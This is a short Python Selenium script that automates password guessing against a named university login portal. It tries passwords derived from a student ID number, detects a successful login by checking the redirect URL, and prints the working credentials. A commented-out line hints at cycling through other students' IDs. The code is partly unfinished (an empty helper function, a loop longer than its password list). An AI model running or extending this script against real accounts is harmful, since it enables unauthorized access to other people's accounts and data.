#coding:utf-8
import requests
from selenium import webdriver
from selenium.webdriver.support.select import Select
from bs4 import BeautifulSoup

url = "http://sba.neu.edu.cn/NEU/DivLogin.asp"
id_xpath = '''//*[@id="loginName"]'''
passwd_xpath = '''//*[@id="loginPass"]'''
select_xpath = '''//*[@id="usertype"]'''
submit_xpath = '''//*[@id="img1"]'''
error_url = "http://sba.neu.edu.cn/NEU/index.asp"

turns = 100

def Login(driver,id,passwd):
    driver.get(url)
    driver.find_element_by_xpath(id_xpath).clear()
    driver.find_element_by_xpath(id_xpath).send_keys(id)
    driver.find_element_by_xpath(passwd_xpath).clear()
    driver.find_element_by_xpath(passwd_xpath).send_keys(passwd)
    sel = driver.find_element_by_xpath(select_xpath)
    Select(sel).select_by_value("3")
    driver.find_element_by_xpath(submit_xpath).click()

def getInfo(url):
    html = requests.get(url).text
    soup = BeautifulSoup(html,'html.parser')
    
    
    
def main():
    id = 20170110
    driver = webdriver.Firefox()
    for i in range(turns):
        #id = id + 1
        list = ["170110","0170110","20170110"]
        passwd = list[i]
        Login(driver,id,passwd)
        #time.sleep(2)
        try:
            if driver.current_url==error_url:
                print("{}:{}Failed".format(id,passwd))
                continue
            else:
                print("Successful")
                print("Suc_id:{}\nSuc_passwd:{}".format(id,passwd))
                break
        except:
            print("{}:{}Failed".format(id,passwd))
            continue

main()

